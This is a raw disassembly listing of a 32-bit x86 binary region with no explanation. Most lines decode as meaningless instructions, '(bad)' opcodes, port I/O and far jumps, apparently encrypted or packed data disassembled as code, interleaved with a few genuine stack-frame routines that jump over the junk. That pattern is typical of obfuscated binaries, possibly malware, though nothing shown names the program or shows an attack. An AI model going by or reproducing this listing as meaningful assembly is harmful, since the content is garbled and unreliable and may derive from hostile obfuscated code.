  412117:	mov    al,fs:0xe159d74b
  41211d:	test   al,0xb3
  41211f:	out    0xfa,al
  412121:	inc    ecx
  412122:	inc    edx
  412123:	sbb    al,BYTE PTR [edi]
  412125:	or     DWORD PTR [esi-0xe],esi
  412128:	stos   BYTE PTR es:[edi],al
  412129:	icebp  
  41212a:	xor    edi,DWORD PTR [esi]
  41212c:	cwde   
  41212d:	mov    al,0xd7
  41212f:	jo     0x4120b6
  412131:	xor    al,dl
  412133:	push   esp
  412134:	in     eax,dx
  412135:	jg     0x41218a
  412137:	inc    esi
  412138:	mov    al,ds:0xef4abf69
  41213d:	mov    ch,0x74
  41213f:	adc    al,0x1f
  412141:	cs or  eax,0xf8f94bab
  412147:	mov    ss,WORD PTR [edi+0x33c4de1b]
  41214d:	jcxz   0x412181
  412150:	adc    al,0x93
  412152:	dec    esp
  412153:	stos   BYTE PTR es:[edi],al
  412154:	leave  
  412155:	(bad)  
  412156:	pop    esi
  412157:	in     eax,0x67
  412159:	xchg   ebx,eax
  41215a:	add    bh,dh
  41215c:	pop    ds
  41215d:	mov    ebp,DWORD PTR [edx-0x4db0ff4c]
  412163:	mov    ebx,DWORD PTR [ecx+0x54]
  412166:	mov    dh,0x51
  412168:	push   ebx
  412169:	add    BYTE PTR [edx+0x19],bl
  41216c:	add    ch,dl
  41216e:	ror    BYTE PTR [esi-0x6],0xab
  412172:	mov    eax,ds:0x5ad8a23e
  412177:	sub    DWORD PTR [ecx],ecx
  412179:	pop    es
  41217a:	outs   dx,DWORD PTR ds:[esi]
  41217b:	add    dl,bh
  41217d:	push   cs
  41217e:	jg     0x41211b
  412180:	jmp    0xf020177c
  412185:	xor    eax,0xef790728
  41218a:	push   edi
  41218b:	pop    ebp
  41218c:	es xor eax,0xac3f7337
  412192:	ins    DWORD PTR es:[edi],dx
  412193:	mov    cs,WORD PTR [edi]
  412195:	mov    ds:0xe4ae63fe,eax
  41219a:	test   BYTE PTR ds:0xb764657c,bh
  4121a0:	pop    ebx
  4121a1:	cmc    
  4121a2:	jae    0x412193
  4121a4:	jp     0x412155
  4121a6:	rcr    DWORD PTR [ecx+0x65],1
  4121a9:	inc    edx
  4121aa:	pop    eax
  4121ab:	sub    BYTE PTR [edi+0x10],0x16
  4121af:	(bad)  
  4121b0:	mov    dl,BYTE PTR [edx+0x10a42b57]
  4121b6:	add    dl,cl
  4121b8:	xor    ecx,eax
  4121ba:	in     al,dx
  4121bb:	les    ebp,FWORD PTR [esi]
  4121bd:	or     eax,0x9cb23cbb
  4121c2:	leave  
  4121c3:	ds cmc 
  4121c5:	sub    dl,bl
  4121c7:	cld    
  4121c8:	jbe    0x4121f4
  4121ca:	popf   
  4121cb:	in     al,0x74
  4121cd:	lds    esi,FWORD PTR [ecx+ecx*4-0x314f8d36]
  4121d4:	inc    eax
  4121d5:	jecxz  0x41217b
  4121d7:	out    dx,al
  4121d8:	test   al,0x47
  4121da:	mov    esp,?
  4121dc:	mov    esi,0x10047be0
  4121e1:	push   ds
  4121e2:	xchg   bl,cl
  4121e4:	jmp    0x41225c
  4121e6:	mov    ah,0x39
  4121e8:	test   al,0x1c
  4121ea:	inc    edi
  4121eb:	hlt    
  4121ec:	mov    ah,BYTE PTR [esi-0x46]
  4121ef:	cmp    BYTE PTR [ebp+0x5d5bb616],al
  4121f5:	sti    
  4121f6:	shl    BYTE PTR [edx+edi*1],cl
  4121f9:	dec    ebp
  4121fa:	ret    
  4121fb:	pushf  
  4121fc:	and    al,0x27
  4121fe:	and    bl,BYTE PTR [ecx]
  412200:	inc    ecx
  412201:	jp     0x412219
  412203:	cmp    dh,BYTE PTR [edi+0xb]
  412206:	mov    esp,0xaa05e5f8
  41220b:	ins    BYTE PTR es:[edi],dx
  41220c:	popa   
  41220d:	push   0xe4c37b20
  412212:	xor    eax,0x3884
  412217:	mov    eax,DWORD PTR [eax+edx*1]
  41221a:	lea    ecx,[eax+ecx*1-0x27c6df8a]
  412221:	mov    eax,DWORD PTR [ebp-0x34]
  412224:	mov    edx,DWORD PTR [ebp-0xb4]
  41222a:	lea    eax,[edx+eax*1-0x76d2]
  412231:	mov    edx,DWORD PTR [ebp-0x44]
  412234:	mov    esi,DWORD PTR [ebp-0x84]
  41223a:	or     eax,edx
  41223c:	xor    edx,edx
  41223e:	div    esi
  412240:	mov    edx,DWORD PTR [ebp-0x54]
  412243:	add    eax,0x43d7
  412248:	xor    eax,0x5e6a
  41224d:	add    eax,DWORD PTR [edx+ecx*1]
  412250:	mov    ecx,DWORD PTR ds:0x4225ec
  412256:	add    DWORD PTR [eax],ecx
  412258:	mov    eax,DWORD PTR [ebp-0x90]
  41225e:	mov    ecx,DWORD PTR [ebp-0x8c]
  412264:	mov    edx,DWORD PTR [ebp-0xa0]
  41226a:	mov    esi,DWORD PTR [ebp-0x9c]
  412270:	sub    edx,eax
  412272:	mov    eax,DWORD PTR [ebp-0xb0]
  412278:	sbb    esi,ecx
  41227a:	mov    ecx,DWORD PTR [ebp-0xac]
  412280:	xor    edx,eax
  412282:	mov    eax,DWORD PTR [ebp-0xc0]
  412288:	xor    esi,ecx
  41228a:	mov    ecx,DWORD PTR [ebp-0xbc]
  412290:	jmp    0x412505
  412295:	mov    ah,0x74
  412297:	xchg   edx,eax
  412298:	cli    
  412299:	push   edx
  41229a:	fistp  DWORD PTR [edx+ebx*1]
  41229d:	cs jge 0x4122b6
  4122a0:	stos   BYTE PTR es:[edi],al
  4122a1:	ins    BYTE PTR es:[edi],dx
  4122a2:	neg    BYTE PTR [eax]
  4122a4:	stos   BYTE PTR es:[edi],al
  4122a5:	(bad)  
  4122a6:	pusha  
  4122a7:	sbb    BYTE PTR [eax],bl
  4122a9:	jno    0x4122bf
  4122ab:	sbb    BYTE PTR [eax],bl
  4122ad:	xor    BYTE PTR [esi+0xc],ah
  4122b0:	sub    DWORD PTR [ecx+0x39d8e683],edi
  4122b6:	ss sub eax,0x49bbaea5
  4122bc:	bound  esi,QWORD PTR [edi]
  4122be:	out    dx,eax
  4122bf:	ins    BYTE PTR es:[edi],dx
  4122c0:	inc    ebp
  4122c1:	push   edi
  4122c2:	push   0xccbf0e3b
  4122c7:	jg     0x4122d7
  4122c9:	in     eax,dx
  4122ca:	cs xchg bh,al
  4122cd:	ds jns 0x4122dc
  4122d0:	inc    esi
  4122d1:	add    ebx,DWORD PTR ds:0x7e56d10a
  4122d7:	sar    BYTE PTR [ebp+0x7c],0xb6
  4122db:	dec    edx
  4122dc:	push   ebp
  4122dd:	adc    ebx,DWORD PTR [esi]
  4122df:	push   cs
  4122e0:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  4122e2:	inc    ebx
  4122e3:	mov    dl,0x3e
  4122e5:	and    al,0x7f
  4122e7:	jmp    0xa92e:0xa4391828
  4122ee:	xor    BYTE PTR [ebp+0x63],dh
  4122f1:	out    dx,eax
  4122f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122f3:	daa    
  4122f4:	stc    
  4122f5:	pop    esp
  4122f6:	in     al,dx
  4122f7:	and    BYTE PTR [edi],ch
  4122f9:	jmp    0x29ee:0xa2f851f4
  412300:	xchg   ebx,eax
  412301:	test   eax,0xc266655c
  412306:	cmp    DWORD PTR [edi-0x1d],esp
  412309:	mov    bl,BYTE PTR [edi-0x2443b247]
  41230f:	(bad)  
  412310:	jne    0x412299
  412312:	cli    
  412313:	push   edx
  412314:	inc    esp
  412315:	xor    DWORD PTR [ebp+0x6b],esp
  412318:	leave  
  412319:	enter  0x53ae,0x7
  41231d:	or     BYTE PTR [ebx],ah
  41231f:	cmp    eax,0x80f8faaa
  412324:	icebp  
  412325:	in     eax,0x50
  412327:	lahf   
  412328:	ret    
  412329:	in     al,dx
  41232a:	cmp    BYTE PTR [ebp+eax*1-0x1fbf299b],bl
  412331:	int3   
  412332:	dec    ecx
  412333:	fild   DWORD PTR [edx+0x2f]
  412336:	pop    edi
  412337:	mov    edi,0x1b7b6bfb
  41233c:	out    dx,eax
  41233d:	cmp    eax,0x9758486c
  412342:	fist   DWORD PTR [ebp+0x22]
  412345:	scas   al,BYTE PTR es:[edi]
  412346:	or     BYTE PTR es:[eax-0x318f0250],ch
  41234d:	ds ret 
  41234f:	inc    ebx
  412350:	(bad)  
  412351:	hlt    
  412352:	dec    ebx
  412353:	int3   
  412354:	dec    ebx
  412355:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412356:	cmovbe edi,DWORD PTR [edx-0xf]
  41235a:	pop    ebp
  41235b:	add    edi,ecx
  41235d:	ins    BYTE PTR es:[edi],dx
  41235e:	push   es
  41235f:	pop    esi
  412360:	psrld  mm5,QWORD PTR [edx]
  412363:	mov    al,ds:0x6322c383
  412368:	jecxz  0x4123df
  41236a:	push   ss
  41236b:	sub    al,0x30
  41236d:	and    cl,BYTE PTR [eax+0x1dda9b73]
  412373:	push   es
  412374:	inc    ecx
  412375:	sub    ah,dh
  412377:	xchg   edi,eax
  412378:	jg     0x41237b
  41237a:	aad    0x87
  41237c:	mov    esp,0x20ed7c62
  412381:	test   eax,0x1b7a2ac
  412386:	sub    DWORD PTR [eax],0xffffffff
  412389:	out    dx,eax
  41238a:	and    eax,0x4b604bfa
  41238f:	retf   0xb152
  412392:	sub    BYTE PTR [ebx-0x588ab372],ch
  412398:	outs   dx,BYTE PTR ds:[esi]
  412399:	mov    ecx,0xf57d465
  41239e:	jmp    0x412328
  4123a0:	pop    ecx
  4123a1:	jecxz  0x412371
  4123a3:	call   0x9269:0x6f1db800
  4123aa:	jnp    0x412422
  4123ac:	sbb    dh,BYTE PTR [ebp-0x64]
  4123af:	or     eax,0x19a971c
  4123b4:	int3   
  4123b5:	retf   
  4123b6:	xchg   ecx,eax
  4123b7:	inc    ebp
  4123b8:	pop    edi
  4123b9:	ret    
  4123ba:	sbb    ecx,edx
  4123bc:	inc    eax
  4123bd:	mov    ecx,0xee115d76
  4123c2:	mov    bl,0xd8
  4123c4:	(bad)  
  4123c5:	mov    edx,ebp
  4123c7:	inc    ebp
  4123c8:	scas   eax,DWORD PTR es:[edi]
  4123c9:	jne    0x412358
  4123cb:	std    
  4123cc:	sbb    ebx,DWORD PTR [esi-0x68]
  4123cf:	push   cs
  4123d0:	test   eax,0x28ce57ff
  4123d5:	or     al,0x53
  4123d7:	lea    ecx,[ebp-0x2ec20b91]
  4123dd:	jge    0x4123da
  4123df:	inc    edi
  4123e0:	sbb    ecx,DWORD PTR [edx]
  4123e2:	fild   QWORD PTR [ecx]
  4123e4:	add    al,0x25
  4123e6:	test   DWORD PTR [edi+0x61],ebx
  4123e9:	sbb    bh,BYTE PTR [ebp-0x4e]
  4123ec:	nop
  4123ed:	or     al,0xdb
  4123ef:	sbb    eax,0x5216092e
  4123f4:	sar    bl,1
  4123f6:	mov    ch,0xb7
  4123f8:	push   0xfffffff2
  4123fa:	jo     0x4123a6
  4123fc:	dec    edi
  4123fd:	repz adc ecx,DWORD PTR [edx+ecx*2-0x5e3bbc83]
  412405:	cmp    al,cl
  412407:	ficom  WORD PTR [eax+esi*8+0x3ddaa34]
  41240e:	sbb    eax,0x27cfa16
  412413:	adc    eax,0xa24c70f6
  412418:	dec    ecx
  412419:	mul    BYTE PTR [edi]
  41241b:	mov    eax,ds:0x24ecdbfe
  412420:	mov    ebx,0x440f4936
  412425:	fsub   st,st(2)
  412427:	add    bh,BYTE PTR [edx-0x61]
  41242a:	rol    BYTE PTR [edi],1
  41242c:	pop    edi
  41242d:	stc    
  41242e:	or     eax,0xc26ae5a2
  412433:	xor    BYTE PTR [edi+esi*1],ch
  412436:	cwde   
  412437:	cmp    BYTE PTR [esi+0x5eb24166],0xbd
  41243e:	call   0x150a5dd
  412443:	xor    ah,dh
  412445:	test   al,0x56
  412447:	ins    DWORD PTR es:[edi],dx
  412448:	mov    bl,0x70
  41244a:	test   eax,0x1c1a551c
  41244f:	adc    BYTE PTR [edx],0x2
  412452:	stc    
  412453:	cld    
  412454:	cmp    ebp,ecx
  412456:	or     BYTE PTR [esi-0x19],bh
  412459:	jae    0x4124c5
  41245b:	repz addr16 push ebp
  41245e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41245f:	sbb    ecx,DWORD PTR [ebp-0x4a]
  412462:	cmp    ah,ch
  412464:	je     0x41242c
  412466:	sub    eax,0x680ee3ae
  41246b:	mov    ss,WORD PTR [eax+0x1923a2c5]
  412471:	inc    edx
  412472:	push   0x5a
  412474:	sub    DWORD PTR ds:0xb4a14eb2,ebx
  41247a:	stos   DWORD PTR es:[edi],eax
  41247b:	fstp   QWORD PTR [eax]
  41247d:	jecxz  0x412452
  41247f:	pop    ebx
  412480:	dec    eax
  412481:	push   esi
  412482:	in     eax,0xf2
  412484:	ds in  al,dx
  412486:	icebp  
  412487:	pop    es
  412488:	mov    bl,0xbc
  41248a:	(bad)  
  41248b:	adc    edx,DWORD PTR [esi+edx*2]
  41248e:	add    eax,0xe9d660c2
  412493:	scas   al,BYTE PTR es:[edi]
  412494:	test   BYTE PTR [ecx-0x5a98129],dl
  41249a:	dec    ebx
  41249b:	add    dl,BYTE PTR ds:0x664a847
  4124a1:	ins    BYTE PTR es:[edi],dx
  4124a2:	cmp    DWORD PTR [ecx],edx
  4124a4:	stos   BYTE PTR es:[edi],al
  4124a5:	mov    WORD PTR [ebp-0x548f195b],?
  4124ab:	mov    edi,0x2de7b3ba
  4124b0:	test   BYTE PTR [esi-0x617e8b9d],al
  4124b6:	jnp    0x412438
  4124b8:	jo     0x41251d
  4124ba:	aad    0x10
  4124bc:	fs xor eax,0xcdc70e2e
  4124c2:	outs   dx,DWORD PTR ds:[esi]
  4124c3:	fld    QWORD PTR [edx-0x5c]
  4124c6:	jg     0x4124be
  4124c8:	sbb    ecx,edx
  4124ca:	push   ecx
  4124cb:	ja     0x41251f
  4124cd:	jns    0x412466
  4124cf:	lea    esp,[edi-0x7b8f51f8]
  4124d5:	shl    eax,0xbd
  4124d8:	ss sahf 
  4124da:	jbe    0x4124be
  4124dc:	jo     0x4124a3
  4124de:	and    al,0xa4
  4124e0:	xor    eax,edi
  4124e2:	popa   
  4124e3:	adc    edi,DWORD PTR [esi-0x1dbd073]
  4124e9:	push   ecx
  4124ea:	and    al,0xdf
  4124ec:	stc    
  4124ed:	pop    ebp
  4124ee:	xchg   cl,dl
  4124f0:	and    ah,BYTE PTR es:[eax]
  4124f3:	add    esi,ebx
  4124f5:	sub    ecx,DWORD PTR ds:0xe064255e
  4124fb:	mov    BYTE PTR [edx],al
  4124fd:	mov    edi,0x1f6a276
  412502:	mov    WORD PTR [esi-0x1a],es
  412505:	add    edx,eax
  412507:	adc    esi,ecx
  412509:	add    edx,0x2313
  41250f:	adc    esi,0x2a00
  412515:	push   esi
  412516:	push   edx
  412517:	call   0x42206a
  41251c:	mov    ecx,0x1207
  412521:	sub    ecx,eax
  412523:	push   0x0
  412525:	pop    eax
  412526:	jmp    0x41279b
  41252b:	jae    0x41252c
  41252d:	mov    dl,0xf5
  41252f:	sbb    bl,BYTE PTR [ebx+esi*1-0x74c2fe82]
  412536:	jo     0x4125a7
  412538:	pop    ebx
  412539:	sub    DWORD PTR [edx+0x18185c57],ebp
  41253f:	jno    0x412555
  412541:	sbb    BYTE PTR [eax],bl
  412543:	sub    BYTE PTR [edx+0x4a],dl
  412546:	daa    
  412547:	mov    ch,BYTE PTR [edi]
  412549:	in     al,0x9b
  41254b:	enter  0xbe80,0xfa
  41254f:	das    
  412550:	xor    DWORD PTR [ecx+0x3fbb993c],esi
  412556:	outs   dx,DWORD PTR ds:[esi]
  412557:	stos   DWORD PTR es:[edi],eax
  412558:	push   edi
  412559:	jbe    0x4125ae
  41255b:	mov    bh,0x26
  41255d:	aas    
  41255e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41255f:	cmp    eax,0xe37e74a9
  412564:	es cmp cl,BYTE PTR cs:[eax+0x6aa21e24]
  41256c:	imul   dh
  41256e:	jmp    0xf044:0xb56939c4
  412575:	std    
  412576:	xor    eax,0x8b72a9d0
  41257b:	mov    edi,0x37335278
  412580:	xlat   BYTE PTR ds:[ebx]
  412581:	pop    edi
  412582:	adc    ch,BYTE PTR [esi+0x63c3ff09]
  412588:	rcl    DWORD PTR [eax-0x3ba4d3d5],0x39
  41258f:	mov    ah,0x8b
  412591:	test   al,0x9f
  412593:	lods   eax,DWORD PTR ds:[esi]
  412594:	fistp  DWORD PTR [ecx+0x7]
  412597:	sub    bh,bl
  412599:	call   0x63cea27c
  41259e:	cmp    bl,BYTE PTR [ebx+0x66a3d1f2]
  4125a4:	xchg   esi,eax
  4125a5:	es iret 
  4125a7:	adc    eax,0x4561895c
  4125ac:	push   ebp
  4125ad:	add    dl,bh
  4125af:	int3   
  4125b0:	dec    esp
  4125b1:	neg    BYTE PTR [esi+0x51]
  4125b4:	pop    ss
  4125b5:	pop    ds
  4125b6:	out    0xe0,eax
  4125b8:	jae    0x4125a5
  4125ba:	ds xchg ebp,eax
  4125bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125bd:	add    BYTE PTR [edx-0x3b],cl
  4125c0:	jno    0x4125af
  4125c2:	mov    eax,ds:0x562fb211
  4125c7:	int3   
  4125c8:	mov    al,ds:0xf1523d90
  4125cd:	lods   eax,DWORD PTR ds:[esi]
  4125ce:	fst    QWORD PTR [edx]
  4125d0:	ins    DWORD PTR es:[edi],dx
  4125d1:	ins    BYTE PTR es:[edi],dx
  4125d2:	in     eax,0xc0
  4125d4:	stos   BYTE PTR es:[edi],al
  4125d5:	clc    
  4125d6:	pop    edi
  4125d7:	repnz mov DWORD PTR [edi-0x53],ebx
  4125db:	icebp  
  4125dc:	arpl   WORD PTR [esi+0x0],di
  4125df:	jmp    0x2f7:0xc43465ea
  4125e6:	cli    
  4125e7:	daa    
  4125e8:	dec    esi
  4125e9:	rol    al,0xf3
  4125ec:	aam    0x66
  4125ee:	gs mov esp,0x63144b5a
  4125f4:	test   eax,0xa408bc1b
  4125f9:	into   
  4125fa:	lea    edx,ds:0x9588ba1
  412600:	(bad)  
  412601:	fcmovnbe st,st(7)
  412603:	fstp   DWORD PTR [edx+esi*8-0x10]
  412607:	arpl   si,cx
  412609:	push   edi
  41260a:	dec    ecx
  41260b:	push   esp
  41260c:	pop    ebx
  41260d:	nop
  41260e:	cwde   
  41260f:	adc    DWORD PTR [ecx-0x1e],ecx
  412612:	mov    ch,0x77
  412614:	add    al,BYTE PTR [esi+0x74]
  412617:	out    0x89,eax
  412619:	test   DWORD PTR [edx+0x5286b88c],ecx
  41261f:	jmp    0x41266e
  412621:	jp     0x4125f3
  412623:	outs   dx,DWORD PTR ds:[esi]
  412624:	xor    DWORD PTR [edi+0x74],eax
  412627:	mov    ebx,0xda071624
  41262c:	fldenv [ebx]
  41262e:	cmp    eax,0xd34ad4da
  412633:	adc    DWORD PTR [eax+eax*1+0x1b],edx
  412637:	jne    0x4125c2
  412639:	je     0x412648
  41263b:	jecxz  0x4125e8
  41263d:	fadd   st,st(2)
  41263f:	leave  
  412640:	push   0x75c00883
  412645:	(bad)  
  412646:	cli    
  412647:	sbb    BYTE PTR [ebp+0x12359786],bh
  41264d:	adc    BYTE PTR [edx-0x7b6f9536],0xce
  412654:	into   
  412655:	mov    edx,0xcb85dcbe
  41265a:	(bad)  
  41265b:	xchg   DWORD PTR [ecx*4+0x7f13e30b],eax
  412662:	push   cs
  412663:	cli    
  412664:	sbb    al,0xe2
  412666:	mov    esp,0xf27eb7f3
  41266b:	cli    
  41266c:	pop    ebp
  41266d:	or     al,0x47
  41266f:	fldenv [eax-0x31]
  412672:	shl    BYTE PTR [ecx+edx*1],cl
  412675:	loope  0x41262e
  412677:	fst    DWORD PTR ds:0x274d9de8
  41267d:	in     eax,dx
  41267e:	retf   0x242b
  412681:	push   ecx
  412682:	jmp    0x41269b
  412684:	xchg   edx,eax
  412685:	in     al,0xcb
  412687:	scas   eax,DWORD PTR es:[edi]
  412688:	loope  0x4126e3
  41268a:	pop    ebp
  41268b:	add    ah,bl
  41268d:	iret   
  41268e:	or     eax,0xa3cd53b4
  412693:	cmp    BYTE PTR [edi],ah
  412695:	adc    BYTE PTR [ebx-0x78],bh
  412698:	mov    ah,0x71
  41269a:	jg     0x4126bc
  41269c:	ins    DWORD PTR es:[edi],dx
  41269d:	shr    BYTE PTR [ebx],0xbc
  4126a0:	push   edx
  4126a1:	loop   0x41269a
  4126a3:	int3   
  4126a4:	cs pop ebp
  4126a6:	add    al,0x75
  4126a8:	(bad)
  4126ad:	or     bl,dl
  4126af:	xor    al,0x9
  4126b1:	rcl    BYTE PTR [edx+0x262a0669],cl
  4126b7:	popa   
  4126b8:	pextrw ecx,(bad),0xc5
  4126ba:	dec    eax
  4126bb:	ror    BYTE PTR [ebx+0x1463ecbf],0x96
  4126c2:	jae    0x4126d9
  4126c4:	xchg   ebp,eax
  4126c5:	cmp    eax,0xd24c47cc
  4126ca:	pushf  
  4126cb:	in     al,0x3d
  4126cd:	ins    BYTE PTR es:[edi],dx
  4126ce:	popa   
  4126cf:	sbb    eax,0x7dfc7470
  4126d4:	loope  0x412687
  4126d6:	cli    
  4126d7:	cmp    DWORD PTR [ebx+0x8f81722],esi
  4126dd:	icebp  
  4126de:	sub    esp,esi
  4126e0:	adc    al,0xb
  4126e2:	pop    ecx
  4126e3:	imul   ebx,DWORD PTR [ebx],0xbbc105ae
  4126e9:	xor    DWORD PTR [ebp+0x126bd2d2],0x9246b90e
  4126f3:	jnp    0x4126c2
  4126f5:	into   
  4126f6:	dec    ebp
  4126f7:	out    0x1f,eax
  4126f9:	cs cwde 
  4126fb:	sbb    al,0x1b
  4126fd:	fs mov ecx,0x691109ae
  412703:	mov    dh,0xfb
  412705:	sbb    al,0xc
  412707:	cmp    DWORD PTR [edi-0x1],esi
  41270a:	dec    ebx
  41270b:	ret    
  41270c:	push   esi
  41270d:	cmp    bl,BYTE PTR [ecx-0x4c]
  412710:	jmp    0x5f7e:0xea1fd8fc
  412717:	inc    esp
  412718:	add    al,ch
  41271a:	add    ebx,DWORD PTR [ebx+0x13]
  41271d:	sub    BYTE PTR [edi+0x3ac7a726],bl
  412723:	pushf  
  412724:	mov    edi,ebx
  412726:	iret   
  412727:	std    
  412728:	cvtps2pi mm6,QWORD PTR [ebx+0x3f8be557]
  41272f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412730:	xor    esi,ebx
  412732:	out    0x5a,al
  412734:	test   DWORD PTR [ebp-0x4c],edx
  412737:	mov    eax,0x2a1b0ffa
  41273c:	shr    bl,0xdf
  41273f:	std    
  412740:	in     eax,dx
  412741:	add    DWORD PTR [ebp+0x6c9f817e],esi
  412747:	ret    
  412748:	add    ch,BYTE PTR ds:0x1d7f34c3
  41274e:	leave  
  41274f:	loope  0x4127a1
  412751:	jno    0x412705
  412753:	shr    BYTE PTR cs:[ebx],1
  412756:	push   ebp
  412757:	(bad)  [ecx+0x70]
  41275a:	jnp    0x412769
  41275c:	mov    esp,0x5679d949
  412761:	jecxz  0x41273a
  412763:	jb     0x412767
  412765:	pop    edx
  412766:	mov    bh,0x1f
  412768:	push   0xffffffb4
  41276a:	nop
  41276b:	fimul  WORD PTR [edi+ecx*4+0x644efe7f]
  412772:	out    0x39,al
  412774:	addr16 push edi
  412776:	mov    ds:0xfb20386b,al
  41277b:	jle    0x412793
  41277d:	jg     0x4127e8
  41277f:	mov    ch,0x1b
  412781:	or     edi,DWORD PTR [esi+0x5fc418f0]
  412787:	push   esp
  412788:	inc    edi
  412789:	pushf  
  41278a:	test   eax,0x390f17ea
  41278f:	pop    ds
  412790:	xor    BYTE PTR [esi-0x61],cl
  412793:	shl    DWORD PTR [eax],cl
  412795:	xchg   DWORD PTR ss:[edi+0x1b24f6d7],ebp
  41279c:	ret    0x158b
  41279f:	in     al,dx
  4127a0:	and    eax,0xf6330042
  4127a5:	cmp    edx,ecx
  4127a7:	jne    0x4127da
  4127ad:	cmp    esi,eax
  4127af:	jne    0x4127da
  4127b5:	mov    eax,DWORD PTR [ebp-0x4]
  4127b8:	mov    ecx,DWORD PTR [ebp-0x8]
  4127bb:	add    eax,0x4296
  4127c0:	shr    eax,0x2
  4127c3:	or     eax,ecx
  4127c5:	mov    ecx,DWORD PTR [ebp-0x10]
  4127c8:	xor    eax,ecx
  4127ca:	xor    eax,0x4e94
  4127cf:	add    eax,DWORD PTR ds:0x4225ec
  4127d5:	mov    ds:0x4225f4,eax
  4127da:	pop    esi
  4127db:	leave  
  4127dc:	ret    0x4
  4127df:	push   ebp
  4127e0:	mov    ebp,esp
  4127e2:	sub    esp,0x58
  4127e5:	push   ebx
  4127e6:	push   esi
  4127e7:	push   edi
  4127e8:	mov    DWORD PTR [ebp-0x58],0x3082
  4127ef:	mov    DWORD PTR [ebp-0x54],0x37a2
  4127f6:	mov    DWORD PTR [ebp-0x50],0x49d6
  4127fd:	mov    DWORD PTR [ebp-0x4c],0x6390
  412804:	mov    DWORD PTR [ebp-0x48],0x40f2
  41280b:	mov    DWORD PTR [ebp-0x44],0x21d4
  412812:	mov    DWORD PTR [ebp-0x28],0x4726
  412819:	mov    DWORD PTR [ebp-0x24],0x221a
  412820:	mov    DWORD PTR [ebp-0x30],0x768c
  412827:	mov    DWORD PTR [ebp-0x2c],0x29e8
  41282e:	mov    DWORD PTR [ebp-0x40],0x6cf6
  412835:	mov    DWORD PTR [ebp-0x3c],0x94c
  41283c:	mov    DWORD PTR [ebp-0x38],0x4797
  412843:	mov    DWORD PTR [ebp-0x34],0x4439
  41284a:	mov    DWORD PTR [ebp-0x20],0x2531
  412851:	mov    esi,0x5a3e
  412856:	mov    DWORD PTR [ebp-0x1c],esi
  412859:	mov    DWORD PTR [ebp-0x18],0x2e83e7a
  412860:	mov    DWORD PTR [ebp-0x14],0x7
  412867:	mov    DWORD PTR [ebp-0x10],0xe3a
  41286e:	mov    DWORD PTR [ebp-0xc],0x6a6e
  412875:	mov    DWORD PTR [ebp-0x8],0x6b99
  41287c:	mov    DWORD PTR [ebp-0x4],0x2acd
  412883:	mov    eax,DWORD PTR [ebp-0x10]
  412886:	mov    ecx,DWORD PTR [ebp-0xc]
  412889:	mov    eax,DWORD PTR [ebp-0x8]
  41288c:	mov    ecx,DWORD PTR [ebp-0x4]
  41288f:	mov    eax,DWORD PTR [ebp-0x18]
  412892:	mov    ecx,DWORD PTR [ebp-0x14]
  412895:	jmp    0x412c6d
  41289a:	icebp  
  41289b:	not    esi
  41289d:	xchg   ecx,eax
  41289e:	into   
  41289f:	xor    DWORD PTR [esi],ebp
  4128a1:	jbe    0x4128b2
  4128a3:	cmc    
  4128a4:	gs mov esp,0xb0ab0c81
  4128aa:	scas   al,BYTE PTR es:[edi]
  4128ab:	pop    eax
  4128ac:	sbb    BYTE PTR [eax],bl
  4128ae:	stos   BYTE PTR es:[edi],al
  4128af:	adc    bl,BYTE PTR [eax]
  4128b1:	sbb    al,ah
  4128b3:	or     esp,DWORD PTR [ecx+esi*1+0x76]
  4128b7:	cmp    al,0x54
  4128b9:	or     al,0x2b
  4128bb:	setge  ch
  4128be:	mov    edx,0xde63a84
  4128c3:	mov    al,0x83
  4128c5:	out    0x93,al
  4128c7:	(bad)  
  4128c9:	dec    ebp
  4128ca:	cdq    
  4128cb:	sub    DWORD PTR [ebx+0x1f],ebx
  4128ce:	js     0x412949
  4128d0:	jmp    0x17399cc0
  4128d5:	or     DWORD PTR [eax+0x3271854f],edi
  4128db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128dc:	xor    eax,0x3d082ed4
  4128e1:	or     eax,0xd069b292
  4128e6:	push   esi
  4128e7:	outs   dx,DWORD PTR ds:[esi]
  4128e8:	mov    ecx,0x5f5e88c1
  4128ed:	and    al,0x6c
  4128ef:	cwde   
  4128f0:	out    dx,eax
  4128f1:	cmp    BYTE PTR [ebx-0x61],0xa6
  4128f5:	pop    esi
  4128f6:	mov    DWORD PTR [ecx+0x47],ebx
  4128f9:	loopne 0x412934
  4128fb:	adc    DWORD PTR [ecx-0x42edea0],esp
  412901:	into   
  412902:	mov    bl,0x9a
  412904:	cli    
  412905:	push   0x33
  412907:	jle    0x4128d5
  412909:	adc    DWORD PTR [ebx],edi
  41290b:	mov    esi,ebp
  41290d:	fwait
  41290e:	out    dx,al
  41290f:	shl    DWORD PTR [edx*4+0x600af6bf],0xfe
  412917:	cld    
  412918:	or     eax,0x699e402f
  41291d:	sub    eax,0x8387858e
  412922:	sub    al,0xae
  412924:	(bad)  
  412925:	lock imul ecx,DWORD PTR [esi*2-0x77484fa5],0x46
  41292e:	and    BYTE PTR [edx-0x4c],cl
  412931:	mov    edx,DWORD PTR [ebx-0x4e7f96a8]
  412937:	or     esi,ebx
  412939:	pop    edx
  41293a:	xchg   ebp,eax
  41293b:	jl     0x412999
  41293d:	sbb    eax,0xc3a24c9a
  412942:	sbb    al,0xa7
  412944:	push   es
  412945:	retf   
  412946:	or     dh,dh
  412948:	lea    eax,[ecx-0xe]
  41294b:	stos   DWORD PTR es:[edi],eax
  41294c:	jbe    0x4128f2
  41294e:	popa   
  41294f:	gs ins BYTE PTR es:[edi],dx
  412951:	dec    eax
  412952:	in     al,0x56
  412954:	hlt    
  412955:	mov    edx,0xbde3be00
  41295a:	sbb    edi,edx
  41295c:	jbe    0x412971
  41295e:	cwde   
  41295f:	stos   DWORD PTR es:[edi],eax
  412960:	js     0x4129d6
  412962:	cli    
  412963:	sbb    BYTE PTR [ecx],0xcf
  412966:	fild   QWORD PTR [edi-0x44]
  412969:	add    esp,ebx
  41296b:	retf   
  41296c:	hlt    
  41296d:	mov    ds:0xe125250e,al
  412972:	fld    TBYTE PTR [edx+0x2f]
